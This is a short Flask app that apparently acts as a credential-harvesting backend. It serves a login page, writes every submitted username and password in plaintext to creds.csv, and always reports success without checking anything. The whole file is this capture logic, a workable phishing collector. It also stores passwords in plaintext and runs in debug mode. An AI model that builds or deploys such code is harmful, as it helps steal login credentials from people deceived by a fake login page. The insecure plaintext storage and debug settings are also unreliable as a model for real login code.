from flask import Flask, request, render_template, url_for, jsonify
import csv

app = Flask(__name__)
@app.route("/")

def index ():
    return render_template("login.html") 

@app.route("/login", methods=["POST"])

def login ():
    username=request.json.get("username")
    password=request.json.get("password")

    with open("creds.csv", "a")as file:
        csvwriter=csv.writer(file)
        csvwriter.writerow([username, password])
    
    return jsonify({
        "status":"sucess"
    }),201

app.run(debug=True)